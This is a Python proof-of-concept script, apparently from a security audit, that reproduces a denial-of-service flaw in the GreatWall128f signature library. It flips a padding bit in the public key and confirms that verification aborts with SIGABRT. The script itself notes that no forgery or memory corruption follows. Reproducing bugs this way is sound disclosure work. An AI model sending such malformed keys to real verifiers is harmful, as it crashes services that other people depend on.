#!/usr/bin/env python3
"""Reproduce GreatWall's verifier-reachable public-key assertion."""

from __future__ import annotations

import ctypes
import os
import signal
from pathlib import Path


ROOT = Path(__file__).resolve().parent
LIBRARY = ROOT / "lib" / "libGreatWall128f.so"


def run_child(lib: ctypes.CDLL, pk: bytes, sig: bytes, message: bytes) -> int:
    pid = os.fork()
    if pid == 0:
        pk_buf = ctypes.create_string_buffer(pk)
        sig_buf = ctypes.create_string_buffer(sig)
        msg_buf = ctypes.create_string_buffer(message)
        result = lib.sig_verify(
            pk_buf, len(pk), sig_buf, len(sig), msg_buf, len(message)
        )
        os._exit(0 if result == 0 else 1)
    _, status = os.waitpid(pid, 0)
    return status


def main() -> int:
    if not LIBRARY.is_file():
        print(f"missing {LIBRARY}; run: make -C {ROOT}")
        return 77

    lib = ctypes.CDLL(str(LIBRARY))
    for name in ("sig_get_pk_len_bytes", "sig_get_sk_len_bytes", "sig_get_sn_len_bytes"):
        getattr(lib, name).restype = ctypes.c_ulonglong

    pk_len = lib.sig_get_pk_len_bytes()
    sk_len = lib.sig_get_sk_len_bytes()
    sig_cap = lib.sig_get_sn_len_bytes()
    pk = (ctypes.c_ubyte * pk_len)()
    sk = (ctypes.c_ubyte * sk_len)()
    actual_pk = ctypes.c_ulonglong()
    actual_sk = ctypes.c_ulonglong()
    message = b"GreatWall malformed-public-key assertion"
    msg = ctypes.create_string_buffer(message)
    sig = (ctypes.c_ubyte * sig_cap)()
    actual_sig = ctypes.c_ulonglong()

    if lib.sig_keygen(pk, ctypes.byref(actual_pk), sk, ctypes.byref(actual_sk)) != 0:
        raise RuntimeError("sig_keygen failed")
    if lib.sig_sign(sk, sk_len, msg, len(message), sig, ctypes.byref(actual_sig)) != 0:
        raise RuntimeError("sig_sign failed")

    pk_bytes = bytes(pk)
    sig_bytes = bytes(sig[: actual_sig.value])
    control = run_child(lib, pk_bytes, sig_bytes, message)
    if not os.WIFEXITED(control) or os.WEXITSTATUS(control) != 0:
        raise RuntimeError(f"honest verification control failed: wait status {control}")

    # GreatWall128f packs two 137-bit elements into two 18-byte fields.  Bit 7
    # of each last byte is padding; the parser asserts that it is zero.
    aborted = 0
    for offset in (17, 35):
        malformed = bytearray(pk_bytes)
        malformed[offset] ^= 0x80
        status = run_child(lib, bytes(malformed), sig_bytes, message)
        if os.WIFSIGNALED(status) and os.WTERMSIG(status) == signal.SIGABRT:
            aborted += 1
        else:
            raise RuntimeError(
                f"malformed pk offset {offset} did not abort: wait status {status}"
            )

    print(
        "CONFIRMED sign-13-2: honest public key verifies; "
        f"{aborted}/2 noncanonical padding-bit mutations terminate with SIGABRT"
    )
    print("LIMITATION sign-13-2: denial of service only; no forgery or memory corruption")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
